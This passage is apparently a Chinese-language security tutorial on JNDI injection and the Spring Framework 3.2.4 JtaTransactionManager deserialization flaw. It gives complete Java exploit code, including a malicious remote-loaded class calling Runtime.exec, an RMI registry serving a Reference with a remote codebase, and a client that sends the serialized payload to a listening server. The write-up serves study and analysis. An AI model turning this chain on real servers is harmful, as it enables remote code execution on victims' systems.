编写RMI客户端类:
    package JNDI;
    import javax.naming.Context;
    import javax.naming.InitialContext;
    public class RMIClient {
        public static void main(String[] args)  throws  Exception{
            String uri = "http://127.0.0.1:2333/EvilObj";
            Context ctx = new InitialContext();
            System.out.println("Being Looking up");
            ctx.lookup(uri);
        }
    }
客户端这里直接将可控数据写入，`uri`即是我们可控的数据，这里直接演示将可控数据替换为构造好的恶意RMI服务器的地址，调用`lookup()`去获得远程类`EvilObj`
编写恶意类文件EvilObj
    public class EvilObj {
        public EvilObj() throws Exception{
            Runtime runtime = Runtime.getRuntime();
            String command = "calc.exe";
            runtime.exec(command);
        }
    }
在此过程中，我们知道客户端通过`lookup()`获取远程对象时，获得一个`Reference`类的`stub`,由于其为`Reference`实例，客户端首先加载本地`CLASSPATH`查询名为`EvilObj`的类，如果没有找到，则会去请求`http://127.0.0.1:2333/EvilObj.class`来动态加载该类，并且调用`EvilObj`的构造方法
>
> 注意为了避免加载本地CLASSPATH中的EvilObj类，可以将本地生成的`EvilObj.class`和`EvilObj.java`删除或者转移到其他目录下,或者直接使用javac将文件编译
最终成功调用`EvilObj`的构造方法实现RCE
但是尽管可以执行，在客户端却会抛出异常，这里经过调试发现:
在此处实例化该类(`EvilObj`)后会实现类型转化为`ObjectFactory`类，而该类实际上是一个接口，因此我们需要在编写`EvilObj`类时实现该接口，该接口仅定义了一个方法:
因此这里利用前文所述，在`getObjectInstance()`方法写入恶意代码，只需要改写`EvilObj.java`即可:
    import javax.naming.Context;
    import javax.naming.Name;
    import javax.naming.spi.ObjectFactory;
    import java.util.Hashtable;
    public class EvilObj implements ObjectFactory {
        public EvilObj() throws Exception{
        }
        @Override
        public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable environment) throws Exception {
        //恶意代码放到getObjectInstance中
            Runtime runtime = Runtime.getRuntime();
            String cmd = "calc.exe";
            Process pc = runtime.exec(cmd);
            pc.waitFor();
            return null;
        }
    }
现在便不会抛出异常，因为该类可以类型转化为`ObjectFactory`，跟进调试查看:  
`NamingManager.java`中可以发现此时factory类不为null,该类就是`EvilObj`类型转化为对象工厂的实例
再通过`getObjectInstance()`获取外部远程对象实例`EvilObj`
因此我们重写`getObjectInstance`方法，写入恶意代码，也会得以执行
## Spring Framework 反序列化 RCE漏洞分析
选择版本为`Spring Framework 3.2.4`
Spring 框架中的远程代码执行的缺陷在于spring-tx-xxx.jar中的`org.springframework.transaction.jta.JtaTransactionManager`类，该类实现了`Java
Transaction API`，主要功能是处理分布式的事务管理，既然是反序列化漏洞，我们直接定位到`readObject()`方法即可:
跟进`initUserTransactionAndTransactionManager()`方法:
    protected void initUserTransactionAndTransactionManager() throws TransactionSystemException {
            // Fetch JTA UserTransaction from JNDI, if necessary.
            if (this.userTransaction == null) {
                if (StringUtils.hasLength(this.userTransactionName)) {
                    this.userTransaction = lookupUserTransaction(this.userTransactionName);
                    this.userTransactionObtainedFromJndi = true;
                }
                else {
                    this.userTransaction = retrieveUserTransaction();
                }
            }
            // Fetch JTA TransactionManager from JNDI, if necessary.
            if (this.transactionManager == null) {
                if (StringUtils.hasLength(this.transactionManagerName)) {
                //可以看到在这里调用了lookupUserTransaction方法
                    this.transactionManager = lookupTransactionManager(this.transactionManagerName);
                }
                else {
                    this.transactionManager = retrieveTransactionManager();
                }
            }
            // Autodetect UserTransaction at its default JNDI location.
            if (this.userTransaction == null && this.autodetectUserTransaction) {
                this.userTransaction = findUserTransaction();
            }
            // Autodetect UserTransaction object that implements TransactionManager,
            // and check fallback JNDI locations else.
            if (this.transactionManager == null && this.autodetectTransactionManager) {
                this.transactionManager = findTransactionManager(this.userTransaction);
            }
            // If only JTA TransactionManager specified, create UserTransaction handle for it.
            if (this.userTransaction == null && this.transactionManager != null) {
                this.userTransaction = buildUserTransaction(this.transactionManager);
            }
        }
注释中明确提到支持通过配置好的transaction名称用JNDI的方式进行查找，而`this.transactionManagerName`是可控的，可以通过`setTransactionManagerName()`方法来赋值，不妨跟进`lookupUserTransaction`:
最终会调用JndiTemplate的lookup方法，如下:
因此这又回到了JNDI注入的问题上，之所以称之为反序列化漏洞，可能是因为利用入口点在`readObject()`方法上，但是思路都是JNDI注入的思路
对于该漏洞，我们所利用的也是三个地方:
  * userTransactionName，可以指定为攻击者自己注册的RMI服务。
  * codebase url，远程调用类的路径（攻击者可控）
  * JtaTransactionManager类中的readObject方法在反序列化事触发了JNDI的RCE
###  Spring Framework Demo演示
参考Github上已有的演示demo: [https://github.com/zerothoughts/spring-jndi](https://)
**客户端**  
这里`Clinet`客户端的编写思路和之前差不多:
    package SpringVuln;
    import com.sun.jndi.rmi.registry.ReferenceWrapper;
    import org.springframework.transaction.jta.JtaTransactionManager;
    import javax.naming.Reference;
    import java.io.ObjectOutputStream;
    import java.net.Socket;
    import java.rmi.registry.LocateRegistry;
    import java.rmi.registry.Registry;
    public class ClientExploit {
        /***
         * 启动RMI服务
         *
         * @throws Exception
         */
        public static void lanuchRMIregister() throws Exception{
            System.out.println("Creating RMI register...");
            Registry registry = LocateRegistry.createRegistry(1099);
            // 最终下载恶意类的地址为http://127.0.0.1:9999/SpringExploitObj.class
            Reference refObj = new Reference("EvilObj","EvilObj","http://127.0.0.1:9999/");
            //使用ReferenceWrapper包装，其继承了UnicastRemoteObject因此实现了Remote接口
            ReferenceWrapper referenceWrapper = new ReferenceWrapper(refObj);
            registry.bind("refObj",referenceWrapper);
        }
        /***
         * 发送payload
         *
         * @throws Exception
         */
        public static  void sendPayload() throws Exception{
            //定义jndi的调用地址
            String uri = "rmi://127.0.0.1:1099/refObj";
            //实例化利用类JtaTransactionManager
            JtaTransactionManager jtaTransactionManager = new JtaTransactionManager();
            //调用setUserTransactionName方法从而控制userTransactionName
            jtaTransactionManager.setUserTransactionName(uri);
            //发送经过序列化后的Payload，等待服务端实例化时反序列化触发漏洞
            Socket socket = new Socket("127.0.0.1",2333);
            System.out.println("Sending Payload...");
            ObjectOutputStream oos = new ObjectOutputStream(socket.getOutputStream());
            oos.writeObject(jtaTransactionManager);
            oos.flush();
            oos.close();
            socket.close();
        }
        public static void main(String[] args) throws Exception{
            lanuchRMIregister();
            sendPayload();
        }
    }
**服务端**  
服务端只需将得到的数据反序列化即可:
    package SpringVuln;
    import java.io.ObjectInputStream;
    import java.net.ServerSocket;
    import java.net.Socket;
    public class ServerExploit {
        public static void main(String[] args) {
            try {
                //create socket
                ServerSocket serverSocket = new ServerSocket(Integer.parseInt("2333"));
                System.out.println("Server started on port "+serverSocket.getLocalPort());
                while(true) {
                    //wait for connect
                    Socket socket=serverSocket.accept();
                    System.out.println("Connection received from "+socket.getInetAddress());
                    ObjectInputStream objectInputStream = new ObjectInputStream(socket.getInputStream());
                    try {
                        //readObject to DeSerialize
                        Object object = objectInputStream.readObject();
                        System.out.println("Read object "+object);
                    } catch(Exception e) {
                        System.out.println("Exception caught while reading object");
                        e.printStackTrace();
                    }
                }
            } catch(Exception e) {
                e.printStackTrace();
            }
        }
    }
恶意类仍然使用之前的`EvilObj`类即可，因为只是简单模拟命令执行操作:
**执行流程**
但是在执行过程中，服务端同样出现了抛出异常的处理，因此我们在通过动态调试来跟进整个利用过程，并且找到抛出异常的原因
**动调跟进**  
在`JtaTransactionManager`中`readObject`下断点:
跟进`initUserTransactionAndTransactionManager()`方法:
继续跟进`lookupUserTransaction()`方法，此时`this.userTransactionName`已经被赋值为`rmi://127.0.0.1:1099`
继续跟进`lookup()`方法,最终调用`ctx.lookup()`
这里因JNDI的动态转换，因此会切换到RMI的上下文环境，最终判断该类是否为`Reference`对象类，本地`CLASSPATH`查询失败后再去远程加载EvilObj类
后续和前文利用JNDI注入的分析过程一致，在这里就不重复了，当然恶意代码可以写在远程加载class中的构造方法中，也可以重写`getObjectInstance()`方法，嵌入到其中。
因此总的来说，`Spring FrameWork`这个反序列化漏洞，整体的核心思路还是JNDI注入的思路，只是在整个`Gadget
Chains`的入口是通过`readObject()`得以触发。
**总结**  
注意并不是使用`Spring`框架开发就会存在此漏洞的利用，原因是因为成功利用JNDI注入需要满足三个方面:
  * 1.存在对象的反序列化，因为反序列化`readObject`是入口
  * 2.由于需要进行远程类下载，因此要求主机必须能够出网
  * 3.CLASSPATH中存在`Spring-tx-xx.jar`的有缺陷的jar包
对于前两个问题来说，条件都是比较能够满足的，例如JBOSS、Weblogic、Jenkins等中间件都存在反序列化之处，但是并不是所有基于`Spring`开发都会使用`Spring-tx-xxx.jar`包，该包并不是这些中间件的默认组件，在这里只是利用该漏洞对JNDI注入有一个更深入的认识。
**最后如有认识错误或者说明不当，还请多多指正和谅解！**
* * *
参考链接:
[https://www.iswin.org/2016/01/24/Spring-framework-deserialization-RCE-%E5%88%86%E6%9E%90%E4%BB%A5%E5%8F%8A%E5%88%A9%E7%94%A8/](https://)
[https://security.tencent.com/index.php/blog/msg/131](https://)
[https://github.com/zerothoughts/spring-jndi](https://)